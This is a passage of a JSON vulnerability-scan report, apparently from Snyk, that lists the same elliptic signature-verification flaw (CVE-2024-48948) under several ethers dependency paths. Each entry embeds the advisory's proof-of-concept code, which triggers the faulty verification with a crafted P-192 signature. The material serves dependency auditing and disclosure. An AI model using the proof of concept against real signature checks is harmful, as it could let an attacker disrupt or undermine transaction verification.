pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/contracts@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/providers@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
